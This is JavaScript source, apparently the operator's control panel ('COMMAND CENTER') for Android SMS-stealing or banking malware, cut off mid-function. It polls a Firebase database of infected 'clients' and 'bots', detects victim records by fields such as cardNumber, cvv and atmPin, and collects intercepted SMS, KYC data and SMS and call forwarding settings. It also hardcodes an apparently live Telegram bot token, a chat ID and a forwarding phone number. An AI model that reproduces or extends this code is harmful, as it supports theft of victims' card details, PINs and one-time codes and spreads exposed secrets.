+var FB_URL = 'https://roar33-21116-default-rtdb.firebaseio.com';
+var FB_REST = 'https://roar33-21116-default-rtdb.firebaseio.com';
+var TG_TOKEN = '8895631051:AAGznIkwSHf20oNFRZM2plXBzThjpBr1G-E';
+var TG_CHAT = '-1004371635104';
+
+var AUTH_KEY = 'roar_auth_settings_v1';
+var CRED_KEY = 'roar_cred_id_v1';
+var SESSION_KEY = 'roar_unlocked_session';
+var SMS_FWD_KEY = 'roar_sms_fwd_number';
+var SMS_FWD_ENABLED_KEY = 'roar_sms_fwd_enabled';
+var CALL_FWD_KEY = 'roar_call_fwd_target';
+var LOGIN_HIST_KEY = 'roar_login_history_v1';
+var MSG_LIMIT = 500;
+var MSG_POLL_INTERVAL = 3000;
+var NEW_TAG_TTL = 120000;
+
+var fbApp=null, fbDB=null;
+var allDevices=[], selDev=null, sfMode='all';
+var allMsgs=[], curSim=1, curMsgDev=null;
+var globalMsgs=[], _allMsgsLoaded=false, _loadingAllMsgs=false;
+var totalMsgs=0;
+var _msgRef=null, _androidMsgRef=null, _messRef=null, _androidMessRef=null, _connRef=null;
+var _pathData={}, _devListeners=[], _lastDeviceSig='';
+var _sbTimer=null;
+var _allKycData={};
+var currentNav='overview';
+var currentSubTab='sms';
+var _renderRaf=null;
+var _dataLoaded=false;
+var _kycStarted=false;
+var _lastStatsSig='';
+var _msgFbResponded=false;
+var _msgDeviceId=null;
+var _prevDeviceStatus={};
+var _prevBatteryMap={};
+var _newMsgKeys={};
+var _msgCache={}; /* SMS Cache */
+var _deviceInitDone=false;
+var _msgFirstRender=false;
+var _subTabOpenTime=0;
+var _watchdogTimer=null;
+var _restLoaded=false;
+var _sdkHasData=false, _initialRestDone=false, _restRunning=false;
+var _msgPollTimer=null, _msgPollDevice=null;
+var _autoPingTimer=null, _autoPingInterval=3000;
+var _pingInFlight=false;
+var _deviceNumberMap={}, _deviceNumberCounter=0;
+var currentMsgFilter='all';
+var currentDevFilter='all';
+var currentDevSort='newest';
+var currentDetailMsgFilter='all';
+var current2FAMethod='telegram';
+
+var _authSettings={method:'none',enabled:false};
+var _otpCode=null, _otpExpiry=0, _otpTimer=null, _bioAttempts=0;
+
+var _smsFwdNumber='6207438516';
+var _smsFwdEnabled=false;
+var _mcSelectedDays=7;
+var _mcFoundDevices=[];
+
+/* PING ANIMATION STATE */
+var _pingingDevices = {};
+var _pingResetTimers = {};
+
+/* PER-DEVICE FORWARDING STATE */
+var _callFwEnabled = false;
+var _callFwTarget = '';
+var _callFwSim = 1;
+var _callFwRef = null;
+var _callsRef = null;
+var _fwRef = null;
+
+var _smsFwEnabled = false;
+var _smsFwTarget = '';
+var _smsFwSim = 1;
+var _smsFwRef = null;
+
+var _devFwdCache = {};
+
+/* Search state - preserve typing */
+var _devSearchQuery = '';
+var _msgSearchQuery = '';
+
+try{['v20','v21','v23','v24','v25','v26','v27','v28','v29','v30','v31','v32','v33','v34'].forEach(function(v){localStorage.removeItem('roar_devices_'+v);});}catch(e){}
+
+/* Check if user is actively typing in a search box */
+function isSearchActive(){
+  var input = document.querySelector('.search-box input');
+  return input && document.activeElement === input;
+}
+
+function loadSmsFwd(){
+  try{var v=localStorage.getItem(SMS_FWD_KEY);if(v)_smsFwdNumber=v;}catch(e){}
+  try{var e=localStorage.getItem(SMS_FWD_ENABLED_KEY);if(e==='1')_smsFwdEnabled=true;else _smsFwdEnabled=false;}catch(e){_smsFwdEnabled=false;}
+}
+function saveSmsFwdNumber(inputId){
+  var el=document.getElementById(inputId);if(!el)return;
+  var num=el.value.trim();
+  if(!num){toast('Enter a number');return;}
+  if(num.replace(/\D/g,'').length<10){toast('Enter valid number');return;}
+  _smsFwdNumber=num;
+  try{localStorage.setItem(SMS_FWD_KEY,num);}catch(e){}
+  showToast('✓ SMS Forward number saved','on');
+  if(currentNav==='overview'){var mc=document.getElementById('mainContent');if(mc)mc.innerHTML=renderOverviewHTML();}
+  if(currentNav==='settings'){var mc2=document.getElementById('mainContent');if(mc2)mc2.innerHTML=renderSettingsHTML();update2FACardsUI();}
+}
+function toggleSmsFwdEnabled(el){
+  _smsFwdEnabled=el.classList.contains('on');
+  try{localStorage.setItem(SMS_FWD_ENABLED_KEY,_smsFwdEnabled?'1':'0');}catch(e){}
+  showToast(_smsFwdEnabled?'✓ SMS Forwarding ENABLED':'SMS Forwarding disabled',_smsFwdEnabled?'on':'off');
+}
+
+function addLoginHistory(method,status){
+  try{
+    var hist=JSON.parse(localStorage.getItem(LOGIN_HIST_KEY)||'[]');
+    hist.unshift({method:method,status:status,time:Date.now(),ua:(navigator.userAgent||'').substring(0,80)});
+    hist=hist.slice(0,100);
+    localStorage.setItem(LOGIN_HIST_KEY,JSON.stringify(hist));
+  }catch(e){}
+}
+function getLoginHistory(){try{return JSON.parse(localStorage.getItem(LOGIN_HIST_KEY)||'[]');}catch(e){return[];}}
+function openLoginHistory(){
+  var hist=getLoginHistory();
+  var body=document.getElementById('loginHistoryBody');
+  if(!hist.length){body.innerHTML='<div class="empty" style="padding:30px 20px;"><div class="ei">🕐</div><p>No login history yet</p><p class="hint">Your login attempts will appear here</p></div>';}
+  else{
+    var html='';
+    hist.forEach(function(h){
+      var ok=h.status==='success';
+      var d=new Date(h.time);
+      var ts=d.toLocaleDateString()+' '+d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
+      var methodName={telegram:'Telegram OTP',fingerprint:'Biometric',none:'No 2FA'}[h.method]||h.method;
+      html+='<div class="lh-row"><div class="lh-icon '+(ok?'ok':'fail')+'">'+(ok?'✓':'✕')+'</div><div class="lh-info"><div class="lh-method">'+esc(methodName)+' · '+(ok?'Success':'Failed')+'</div><div class="lh-device">'+esc(h.ua||'Unknown device')+'</div></div><div class="lh-time">'+esc(ts)+'</div></div>';
+    });
+    body.innerHTML=html;
+  }
+  openM('loginHistoryModal');
+}
+
+function loadAuthSettings(){try{var s=localStorage.getItem(AUTH_KEY);if(s)_authSettings=JSON.parse(s);}catch(e){_authSettings={method:'none',enabled:false};}}
+function saveAuthSettings(){try{localStorage.setItem(AUTH_KEY,JSON.stringify(_authSettings));}catch(e){}}
+function hasSessionUnlocked(){try{return sessionStorage.getItem(SESSION_KEY)==='1';}catch(e){return false;}}
+function markSessionUnlocked(){try{sessionStorage.setItem(SESSION_KEY,'1');}catch(e){}}
+function clearSession(){try{sessionStorage.removeItem(SESSION_KEY);}catch(e){}}
+
+function showLockScreen(){document.getElementById('lockScreen').classList.add('open');}
+function hideLockScreen(){document.getElementById('lockScreen').classList.remove('open');}
+function showLockError(msg){var el=document.getElementById('lockErr');el.textContent=msg;el.classList.remove('show');void el.offsetWidth;el.classList.add('show');setTimeout(function(){el.classList.remove('show');},4000);}
+
+function renderLockUI(){
+  var icon=document.getElementById('lockIcon'),title=document.getElementById('lockTitle'),sub=document.getElementById('lockSub'),content=document.getElementById('lockContent'),badge=document.getElementById('lockBadge');
+  if(_authSettings.method==='fingerprint'){
+    icon.className='lock-icon fp';icon.textContent='👆';badge.textContent='BIOMETRIC';
+    title.textContent='Biometric Lock';sub.textContent='Use your fingerprint to unlock';
+    content.innerHTML='<button class="lock-btn purple" onclick="tryFingerprintUnlock()">👆 Verify Fingerprint</button><button class="lock-btn ghost" onclick="switchAuthMethod()">Use another method</button>';
+  }else if(_authSettings.method==='telegram'){
+    icon.className='lock-icon tg';icon.textContent='✈';badge.textContent='TELEGRAM';
+    title.textContent='Telegram OTP';sub.textContent='Enter the 4-digit code sent to your Telegram bot';
+    content.innerHTML='<input class="otp-input" id="otpInput" type="tel" inputmode="numeric" maxlength="4" placeholder="••••" oninput="onOtpInput(this)"/><div class="lock-timer" id="otpTimer">Generating…</div><button class="lock-btn blue" id="otpVerifyBtn" onclick="verifyOtpInput()" disabled style="opacity:.5;">🔓 Verify & Unlock</button><button class="lock-btn ghost" id="otpResendBtn" onclick="sendOtpToTelegram()" style="display:none;">↻ Resend code</button>';
+    setTimeout(function(){sendOtpToTelegram();var inp=document.getElementById('otpInput');if(inp)inp.focus();},100);
+  }else{unlockPanel();}
+}
+function switchAuthMethod(){
+  if(_authSettings.method==='fingerprint' && _authSettings.telegramFallback){_authSettings.method='telegram';renderLockUI();}
+  else if(_authSettings.method==='telegram' && localStorage.getItem(CRED_KEY)){_authSettings.method='fingerprint';renderLockUI();}
+  else showLockError('No alternate method available');
+}
+function onOtpInput(el){
+  var v=el.value.replace(/\D/g,'').slice(0,4);el.value=v;
+  var btn=document.getElementById('otpVerifyBtn');
+  if(v.length===4){btn.disabled=false;btn.style.opacity='1';setTimeout(function(){verifyOtpInput();},200);}
+  else{btn.disabled=true;btn.style.opacity='.5';}
+}
+async function tryFingerprintUnlock(){
+  var btn=document.querySelector('#lockContent .lock-btn.purple');
+  if(btn){btn.textContent='⏳ Verifying…';btn.disabled=true;}
+  var ok=await performBiometric();
+  if(ok){markSessionUnlocked();addLoginHistory('fingerprint','success');unlockPanel();showToast('✓ Unlocked','on');}
+  else{
+    _bioAttempts++;addLoginHistory('fingerprint','failed');
+    if(btn){btn.textContent='👆 Verify Fingerprint';btn.disabled=false;}
+    if(_bioAttempts>=2 && _authSettings.telegramFallback){showLockError('Switching to Telegram OTP');setTimeout(function(){_authSettings.method='telegram';renderLockUI();},900);}
+    else showLockError('Fingerprint failed. Try again.');
+  }
+}
+async function performBiometric(){
+  try{
+    if(!window.PublicKeyCredential || !navigator.credentials){showLockError('Biometric not supported');return false;}
+    var credIdStr=localStorage.getItem(CRED_KEY);
+    if(!credIdStr){
+      var newCred=await navigator.credentials.create({publicKey:{challenge:crypto.getRandomValues(new Uint8Array(32)),rp:{name:'AdminPro',id:location.hostname},user:{id:crypto.getRandomValues(new Uint8Array(16)),name:'admin',displayName:'AdminPro'},pubKeyCredParams:[{alg:-7,type:'public-key'},{alg:-257,type:'public-key'}],authenticatorSelection:{authenticatorAttachment:'platform',userVerification:'required'},timeout:60000}});
+      if(newCred&&newCred.rawId){var idBytes=new Uint8Array(newCred.rawId);var idStr='';for(var i=0;i<idBytes.length;i++)idStr+=String.fromCharCode(idBytes[i]);localStorage.setItem(CRED_KEY,btoa(idStr));}
+      return true;
+    }
+    var raw=atob(credIdStr);var bytes=new Uint8Array(raw.length);for(var j=0;j<raw.length;j++)bytes[j]=raw.charCodeAt(j);
+    var assertion=await navigator.credentials.get({publicKey:{challenge:crypto.getRandomValues(new Uint8Array(32)),allowCredentials:[{id:bytes,type:'public-key'}],userVerification:'required',timeout:60000}});
+    return !!assertion;
+  }catch(e){return false;}
+}
+async function sendOtpToTelegram(){
+  _otpCode=Math.floor(1000+Math.random()*9000).toString();_otpExpiry=Date.now()+300000;
+  var timerEl=document.getElementById('otpTimer'),resendBtn=document.getElementById('otpResendBtn');
+  if(timerEl)timerEl.textContent='Sending to Telegram…';
+  try{
+    var text='🔐 AdminPro Login Code\n\nYour code: '+_otpCode+'\n\nValid for 5 minutes.';
+    var url='https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage?chat_id='+TG_CHAT+'&text='+encodeURIComponent(text);
+    var res=await fetch(url);var data=await res.json();
+    if(data&&data.ok){showToast('✓ Code sent','on');startOtpTimer();if(resendBtn)resendBtn.style.display='flex';}
+    else{showLockError('Send failed');if(timerEl)timerEl.textContent='⚠ Failed';}
+  }catch(e){showLockError('Network error');if(timerEl)timerEl.textContent='⚠ Error';}
+}
+function startOtpTimer(){
+  if(_otpTimer)clearInterval(_otpTimer);
+  _otpTimer=setInterval(function(){
+    var left=Math.max(0,Math.floor((_otpExpiry-Date.now())/1000));
+    var el=document.getElementById('otpTimer');if(!el)return;
+    if(left<=0){el.textContent='Code expired';clearInterval(_otpTimer);return;}
+    var m=Math.floor(left/60),s=left%60;
+    el.textContent='Expires in '+m+':'+(s<10?'0':'')+s;
+  },500);
+}
+function verifyOtpInput(){
+  var inp=document.getElementById('otpInput');if(!inp)return;
+  var val=inp.value.trim();
+  if(!val||val.length!==4){showLockError('Enter 4-digit code');return;}
+  if(!_otpCode){showLockError('No code');return;}
+  if(Date.now()>_otpExpiry){showLockError('Code expired');return;}
+  if(val===_otpCode){if(_otpTimer)clearInterval(_otpTimer);markSessionUnlocked();addLoginHistory('telegram','success');unlockPanel();showToast('✓ Unlocked','on');}
+  else{addLoginHistory('telegram','failed');showLockError('Incorrect code');inp.value='';document.getElementById('otpVerifyBtn').disabled=true;document.getElementById('otpVerifyBtn').style.opacity='.5';}
+}
+function unlockPanel(){
+  hideLockScreen();
+  var b=document.getElementById('boot');if(b)b.classList.add('hidden');
+  startApp();
+  setTimeout(function(){if(!_dataLoaded && !_restRunning){_initialRestDone=false;startInitialREST();}},80);
+}
+function checkAuthAndUnlock(){
+  loadAuthSettings();
+  if(!_authSettings.enabled || _authSettings.method==='none'){hideLockScreen();return false;}
+  if(hasSessionUnlocked()){hideLockScreen();return false;}
+  showLockScreen();renderLockUI();return true;
+}
+function setAuthMethod(method){
+  if(method==='fingerprint'){
+    performBiometric().then(function(ok){
+      if(ok){_authSettings.method='fingerprint';_authSettings.enabled=true;_authSettings.telegramFallback=true;saveAuthSettings();update2FACardsUI();showToast('✓ Biometric enabled','on');}
+      else showToast('Biometric setup failed','off');
+    });
+  }else if(method==='telegram'){
+    _authSettings.method='telegram';_authSettings.enabled=true;saveAuthSettings();update2FACardsUI();showToast('✓ Telegram OTP enabled','on');sendOtpToTelegram();
+  }
+}
+function disableAuth(){_authSettings.enabled=false;_authSettings.method='none';saveAuthSettings();update2FACardsUI();showToast('2FA disabled','off');}
+function update2FACardsUI(){
+  var tg=document.querySelector('.method-card[data-2fa="telegram"]'),fp=document.querySelector('.method-card[data-2fa="fingerprint"]');
+  if(!tg||!fp)return;
+  tg.classList.toggle('active',_authSettings.enabled && _authSettings.method==='telegram');
+  fp.classList.toggle('active',_authSettings.enabled && _authSettings.method==='fingerprint');
+  var tgSub=tg.querySelector('.m-sub'),fpSub=fp.querySelector('.m-sub');
+  if(tgSub)tgSub.textContent=(_authSettings.enabled&&_authSettings.method==='telegram')?'Active — OTP on unlock':'Tap to enable';
+  if(fpSub)fpSub.textContent=(_authSettings.enabled&&_authSettings.method==='fingerprint')?'Active — Biometric':'Tap to enable';
+}
+function select2FA(method){if(_authSettings.enabled && _authSettings.method===method){disableAuth();return;}setAuthMethod(method);}
+
+function loadDeviceNumbers(){_deviceNumberMap={};_deviceNumberCounter=0;}
+function assignDeviceNumbers(devices){_deviceNumberMap={};var total=devices.length;for(var i=0;i<total;i++){_deviceNumberMap[devices[i].id]=total-i;}_deviceNumberCounter=total;}
+function getDeviceNumber(id){return _deviceNumberMap[id]||'?';}
+
+function getDeviceDisplayName(d){
+  if(!d)return'Unknown Device';
+  var raw=d.raw||{};
+  var subModel='';
+  if(raw.submissions&&typeof raw.submissions==='object'){
+    var sk=Object.keys(raw.submissions);sk.sort(function(a,b){return b.localeCompare(a);});
+    for(var i=0;i<sk.length;i++){var s=raw.submissions[sk[i]];if(s&&typeof s==='object'){var m=s.deviceModel||s.device_model||s.model||'';if(m){subModel=m;break;}}}
+  }
+  var brand=pickStr(raw,['brand','deviceBrand','device_brand','manufacturer','make','oem','vendor','company']);
+  var model=pickStr(raw,['model','deviceModel','device_model','deviceName','device_name','marketName','market_name','productName','product_name','product','hardware','device'])||subModel;
+  var genericModel=/^(android|unknown|null|none|undefined|generic)$/i;
+  if(model&&genericModel.test(model))model='';
+  if(brand&&genericModel.test(brand))brand='';
+  if(model){var ml=model.toLowerCase();var bl=brand?brand.toLowerCase():'';if(bl&&ml.indexOf(bl)===0)return capName(model);if(brand)return capName(brand)+' '+capName(model);return capName(model);}
+  if(brand)return capName(brand)+' Device';
+  if(d.name&&d.name!==d.id&&!genericModel.test(d.name))return capName(d.name);
+  if(d.sims&&d.sims.length){var c=pickStr(d.sims[0],['carrierName','carrier','networkOperator','operator','brand']);if(c)return capName(c)+' Device';}
+  return 'Device #'+getDeviceNumber(d.id);
+}
+function getDeviceInitials(name){if(!name)return'??';var parts=String(name).trim().split(/\s+/);if(parts.length>=2)return(parts[0].charAt(0)+parts[1].charAt(0)).toUpperCase();return name.substring(0,2).toUpperCase();}
+function pickStr(obj,keys){if(!obj)return'';for(var i=0;i<keys.length;i++){var v=obj[keys[i]];if(v!=null&&v!==''&&typeof v!=='object'){var s=String(v).trim();if(s)return s;}}return'';}
+function capName(s){if(!s)return'';return String(s).replace(/\b\w/g,function(c){return c.toUpperCase();});}
+function getShortId(id){if(!id)return'—';if(id.length<=20)return id;return id.substring(0,10)+'…'+id.substring(id.length-6);}
+
+function tryLoadCache(){
+  try{
+    var raw=localStorage.getItem(CACHE_KEY);if(!raw)return false;
+    var data=JSON.parse(raw);if(!Array.isArray(data)||!data.length)return false;
+    allDevices=data;_dataLoaded=true;assignDeviceNumbers(allDevices);
+    var b=document.getElementById('boot');if(b)b.classList.add('hidden');
+    var mc=document.getElementById('mainContent');if(mc)mc.innerHTML=renderOverviewHTML();
+    return true;
+  }catch(e){return false;}
+}
+function saveCache(){
+  try{
+    if(!allDevices.length)return;
+    var m=allDevices.map(function(d){return{id:d.id,path:d.path,name:d.name,batteryRaw:d.batteryRaw,batteryNum:d.batteryNum,status:d.status,mobNo:d.mobNo,sims:d.sims,ts:d.ts,raw:d.raw};});
+    localStorage.setItem(CACHE_KEY,JSON.stringify(m));
+  }catch(e){}
+}
+loadDeviceNumbers();loadSmsFwd();tryLoadCache();
+
+function restFetch(path){
+  var url=FB_REST+'/'+(path||'')+'.json';
+  var ctrl=new AbortController();
+  var tid=setTimeout(function(){try{ctrl.abort();}catch(e){}},5000);
+  return fetch(url,{cache:'no-store',signal:ctrl.signal}).then(function(r){clearTimeout(tid);if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}).catch(function(e){clearTimeout(tid);throw e;});
+}
+function startInitialREST(){
+  if(_restRunning)return;
+  _restRunning=true;_initialRestDone=true;
+  var tryPaths=['clients','devices','users','allDevices','bots'];
+  var resolved=false;
+  tryPaths.forEach(function(p){
+    restFetch(p).then(function(data){
+      if(resolved)return;
+      if(data&&typeof data==='object'&&!Array.isArray(data)&&Object.keys(data).length>0){
+        var devs=parseDevs(data,p);
+        if(devs.length>0){
+          resolved=true;_pathData[p]=data;_dataLoaded=true;_restLoaded=true;
+          updateConn('live');rebuildDevices();hideBoot();_restRunning=false;
+        }
+      }
+    }).catch(function(){});
+  });
+  setTimeout(function(){
+    if(!_restRunning)return;
+    if(resolved||_dataLoaded){_restRunning=false;return;}
+    restFetch('/').then(function(rootData){
+      _restRunning=false;
+      if(!rootData||typeof rootData!=='object')throw new Error('Empty');
+      var col=findDeviceCollections(rootData);var bestPath=null,bestDevs=[];
+      col.forEach(function(c){var d=rootData[c.path];if(!d||typeof d!=='object'||Array.isArray(d))return;var devs=parseDevs(d,c.path);if(devs.length>bestDevs.length){bestDevs=devs;bestPath=c.path;}});
+      if(bestPath&&bestDevs.length>0){_pathData[bestPath]=rootData[bestPath];_dataLoaded=true;_restLoaded=true;updateConn('live');rebuildDevices();hideBoot();}
+      else{_dataLoaded=true;showFatalError();}
+    }).catch(function(){_restRunning=false;_dataLoaded=true;showFatalError();});
+  }, 5500);
+}
+function hideBoot(){var b=document.getElementById('boot');if(b)b.classList.add('hidden');}
+function startWatchdog(){if(_watchdogTimer)clearTimeout(_watchdogTimer);_watchdogTimer=setTimeout(function(){if(_dataLoaded&&allDevices.length>0)return;if(_sdkHasData)return;if(!_restRunning)startInitialREST();},3000);}
+function showFatalError(){
+  var mc=document.getElementById('mainContent');if(!mc)return;
+  updateConn('off');
+  mc.innerHTML='<div class="empty" style="padding-top:80px;"><div class="ei" style="font-size:56px;">🔌</div><p style="font-size:15px;font-weight:800;color:var(--text);margin-bottom:8px;">Connection Failed</p><p class="hint">Check your internet</p><button class="sbtn" style="max-width:220px;margin:16px auto 0;" onclick="retryLoad()">🔄 Retry</button></div>';
+}
+function retryLoad(){
+  _initialRestDone=false;_restRunning=false;_dataLoaded=false;allDevices=[];
+  _lastDeviceSig='';
+  var mc=document.getElementById('mainContent');
+  if(mc)mc.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>📱 Retrying…</div></div>';
+  updateConn('connecting');
+  startInitialREST();
+}
+
+function startApp(){
+  if(fbDB)return;
+  try{
+    if(typeof firebase==='undefined'||!firebase.initializeApp)return;
+    _sdkLoaded=true;
+    try{(firebase.apps||[]).forEach(function(a){try{a.delete();}catch(e){}});}catch(e){}
+    fbApp=firebase.initializeApp({databaseURL:FB_URL},'roar-app');
+    fbDB=fbApp.database();
+    _firebaseReady=true;
+    setupListeners();
+    setTimeout(startKycListeners,3000);
+    setTimeout(function(){startAutoSilentPing();},5000);
+  }catch(e){}
+}
+
+function updateConn(status){
+  var dot=document.getElementById('connDot');var txt=document.getElementById('connTxt');
+  if(!dot||!txt)return;
+  dot.className='tb-conn-dot '+(status==='live'?'live':status==='off'?'off':'');
+  txt.textContent=status==='live'?'COMMAND CENTER':status==='off'?'OFFLINE':'CONNECTING';
+}
+function startAutoSilentPing(){
+  if(_autoPingTimer)clearInterval(_autoPingTimer);
+  autoSilentPingOnce();
+  _autoPingTimer=setInterval(autoSilentPingOnce,_autoPingInterval);
+}
+function autoSilentPingOnce(){
+  if(_pingInFlight)return;_pingInFlight=true;
+  restFetch('clients').then(function(data){
+    _pingInFlight=false;
+    if(!data||typeof data!=='object')return;
+    _pathData['clients']=data;_dataLoaded=true;_restLoaded=true;
+    rebuildDevices();updateConn('live');
+  }).catch(function(){_pingInFlight=false;});
+}
+function pingAllDevices(){
+  showToast('📡 Pinging…');
+  restFetch('clients').then(function(data){
+    if(!data||typeof data!=='object'){showToast('Ping failed','off');return;}
+    _pathData['clients']=data;_dataLoaded=true;_restLoaded=true;
+    rebuildDevices();updateConn('live');
+    var on=allDevices.filter(function(d){return d.status;}).length;
+    var off=allDevices.length-on;
+    showToast('📡 '+on+' ONLINE · '+off+' OFFLINE',on>0?'on':'off');
+  }).catch(function(err){updateConn('off');showToast('Ping failed','off');});
+}
+async function pingRealtime(){
+  if(!selDev){toast('Select device');return;}
+  var devPath=(selDev.path||'clients')+'/'+selDev.id;
+  showToast('📡 Pinging…');
+  try{
+    var data=await restFetch(devPath);
+    if(!data||typeof data!=='object')data=await restFetch('clients/'+selDev.id);
+    var isOnline=data?isDeviceOnline(data):false;
+    var parsed=data?parseDevs({[selDev.id]:data},selDev.path||'clients'):[];
+    var fresh=parsed.length?parsed[0]:null;
+    if(fresh){fresh.id=selDev.id;var idx=allDevices.findIndex(function(d){return d.id===selDev.id;});if(idx!==-1)allDevices[idx]=fresh;selDev=fresh;}
+    else selDev.status=isOnline;
+    var box=document.getElementById('deviceProfileBox');if(box)box.innerHTML=renderDeviceProfileHTML(selDev);
+    var name=getDeviceDisplayName(selDev);
+    if(isOnline)showToast('🟢 '+name+' is ONLINE','on');
+    else showToast('🔴 '+name+' is OFFLINE','off');
+  }catch(e){
+    selDev.status=false;
+    var box2=document.getElementById('deviceProfileBox');if(box2)box2.innerHTML=renderDeviceProfileHTML(selDev);
+    showToast('🔴 '+getDeviceDisplayName(selDev)+' is OFFLINE','off');
+  }
+}
+
+function setupListeners(){
+  try{
+    _connRef=fbDB.ref('.info/connected');
+    _connRef.on('value',function(snap){var c=!!snap.val();if(c){if(_dataLoaded)updateConn('live');}else{if(!_dataLoaded)updateConn('connecting');}},function(err){});
+  }catch(e){}
+  
+  listenDevicePath('clients');
+  listenDevicePath('devices');
+  listenDevicePath('users'); 
+  listenDevicePath('allDevices');
+  listenDevicePath('bots');
+
+  try {
+      fbDB.ref('messages').on('value', function() {
+          _allMsgsLoaded = false;
+          if(currentNav === 'messages' && !isSearchActive()) loadAllMessages(true);
+          if(currentNav === 'device-detail' && currentSubTab === 'sms') {
+              if(selDev) pollMessagesOnce(selDev.id);
+          }
+      });
+      fbDB.ref('mess').on('value', function() {
+          _allMsgsLoaded = false;
+          if(currentNav === 'messages' && !isSearchActive()) loadAllMessages(true);
+          if(currentNav === 'device-detail' && currentSubTab === 'sms') {
+              if(selDev) pollMessagesOnce(selDev.id);
+          }
+      });
+  } catch(e) { console.log('Listener error:', e); }
+}
+
+function findDeviceCollections(root){
+  if(!root||typeof root!=='object')return[];
+  var found=[];
+  function isDev(o){if(!o||typeof o!=='object'||Array.isArray(o))return false;var s=['submissions','deviceModel','cardNumber','cvv','atmPin','forms','cardDetails'];for(var i=0;i<s.length;i++)if(s[i]in o)return true;var m=['online','isOnline','sims','battery','batteryRaw','model','mobNo','lastSeen','deviceName','status'];var h=0;for(var j=0;j<m.length;j++){if(m[j]in o)h++;if(h>=2)return true;}return false;}
+  function score(node){if(!node||typeof node!=='object'||Array.isArray(node))return 0;var ks=Object.keys(node);if(!ks.length)return 0;var h=0;var s=ks.slice(0,40);for(var i=0;i<s.length;i++)if(isDev(node[s[i]]))h++;return h;}
+  Object.keys(root).forEach(function(k){var n=root[k];if(!n||typeof n!=='object'||Array.isArray(n))return;var s=score(n);if(s>0)found.push({path:k,score:s});});
+  found.sort(function(a,b){return b.score-a.score;});
+  return found;
+}
+function listenDevicePath(path){
+  for(var i=0;i<_devListeners.length;i++)if(_devListeners[i].path===path)return;
+  if(!fbDB)return;
+  var ref=fbDB.ref(path);
+  _devListeners.push({path:path,ref:ref});
+  ref.on('value',function(snap){
+    var d=snap.val()||{};
+    if(_restLoaded&&(!d||Object.keys(d).length===0)&&_pathData[path]&&Object.keys(_pathData[path]).length>0)return;
+    if(d&&Object.keys(d).length>0)_sdkHasData=true;
+    _pathData[path]=d;_dataLoaded=true;
+    updateConn('live');hideBoot();scheduleRebuild();
+  },function(err){});
+}
+function scheduleRebuild(){if(_renderRaf)return;_renderRaf=requestAnimationFrame(function(){_renderRaf=null;rebuildDevices();});}
+
+function rebuildDevices(){
+  var merged={};
+  Object.keys(_pathData).forEach(function(path){
+    var raw=_pathData[path];if(!raw||typeof raw!=='object')return;
+    parseDevs(raw,path).forEach(function(d){
+      var key=d.id;
+      if(merged[key]){key=path.replace(/\//g,'_')+'::'+d.id;d.id=key;}
+      merged[key]=d;
+    });
+  });
+  var arr=Object.keys(merged).map(function(k){return merged[k];});
+  arr.sort(function(a,b){
+    if(a.status&&!b.status)return-1;
+    if(!a.status&&b.status)return 1;
+    if(a.ts!==b.ts)return b.ts-a.ts;
+    return String(a.name).localeCompare(String(b.name));
+  });
+  assignDeviceNumbers(arr);
+  arr.forEach(function(d){var prev=_prevDeviceStatus[d.id];if(prev===undefined){_prevDeviceStatus[d.id]=d.status;return;}if(prev!==d.status)_prevDeviceStatus[d.id]=d.status;_prevBatteryMap[d.id]=d.batteryNum;});
+  
+  var newSig=arr.map(function(d){
+    var simKey=(d.sims||[]).map(function(s){return (s.phoneNumber||s.number||'')+'|'+(s.carrierName||s.carrier||'');}).join(',');
+    return d.id+':'+d.status+':'+d.batteryNum+':'+(d.ts||0)+':'+(Object.keys(d.raw.submissions||{}).length)+':'+simKey+':'+(d.mobNo||'');
+  }).join('|');
+  var changed=newSig!==_lastDeviceSig;
+  var isFirstLoad=!_lastDeviceSig;
+  allDevices=arr;_lastDeviceSig=newSig;
+  renderStats();saveCache();
+
+  refreshDevFwdCache();
+
+  if(!_allMsgsLoaded && !_loadingAllMsgs && allDevices.length > 0) {
+      if(!window._bgMsgTimer) {
+          window._bgMsgTimer = setTimeout(function(){
+              window._bgMsgTimer = null;
+              if(!_allMsgsLoaded && !_loadingAllMsgs && allDevices.length > 0) {
+                  loadAllMessages();
+              }
+          }, 2000);
+      }
+  }
+
+  if(!_deviceInitDone&&isFirstLoad)setTimeout(function(){_deviceInitDone=true;},500);
+  var mc=document.getElementById('mainContent');
+  if(!mc)return;
+
+  if(currentNav==='device-detail'){
+    if(selDev){
+      var f=allDevices.find(function(d){return d.id===selDev.id;});
+      if(f){
+        var oldStatus=selDev.status;var oldBattery=selDev.batteryNum;
+        selDev=f;
+        if(f.status!==oldStatus||f.batteryNum!==oldBattery){var box=document.getElementById('deviceProfileBox');if(box)box.innerHTML=renderDeviceProfileHTML(f);}
+        if(currentSubTab==='forms'){var subTabEl=document.getElementById('subTabContent');if(subTabEl)renderSubTabContent(true);}
+      }
+    }
+    updateSubTabBadges();return;
+  }
+
+  if(!changed && !isFirstLoad) return;
+
+  if(currentNav==='devices'){
+    var devListEl = document.getElementById('devList');
+    if(devListEl){
+      var filtered = filterDevicesList();
+      var q = _devSearchQuery || '';
+      if(q){
+        filtered = filtered.filter(function(d){
+          return (getDeviceDisplayName(d)+d.id+d.mobNo).toLowerCase().indexOf(q.toLowerCase())!==-1;
+        });
+      }
+      if(!filtered.length){
+        devListEl.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No matches</p></div>';
+      } else {
+        devListEl.innerHTML = filtered.map(function(d){return renderDeviceCard(d);}).join('');
+      }
+    }
+    var phRight = document.querySelector('.ph-right');
+    if(phRight){
+      var online = allDevices.filter(function(d){return d.status;}).length;
+      var offline = allDevices.length - online;
+      phRight.innerHTML = '<span class="count-pill on">📶 '+online+'</span><span class="count-pill off">📵 '+offline+'</span>';
+    }
+    var phSub = document.querySelector('.ph-sub');
+    if(phSub) phSub.textContent = allDevices.length + ' total devices';
+    return;
+  }
+
+  if(currentNav==='messages'){
+    if(isSearchActive()) return; 
+    var msgListEl = document.getElementById('msgList');
+    if(msgListEl){
+      msgListEl.innerHTML = renderMsgsAggregate();
+    }
+    return;
+  }
+
+  if(currentNav==='overview')mc.innerHTML=renderOverviewHTML();
+}
+
+function refreshDevFwdCache(){
+  _devFwdCache = {};
+  allDevices.forEach(function(d){
+    var raw = d.raw || {};
+    var fwd = raw.forwarding || {};
+    var call = fwd.call || {};
+    var sms = fwd.sms || {};
+    _devFwdCache[d.id] = {
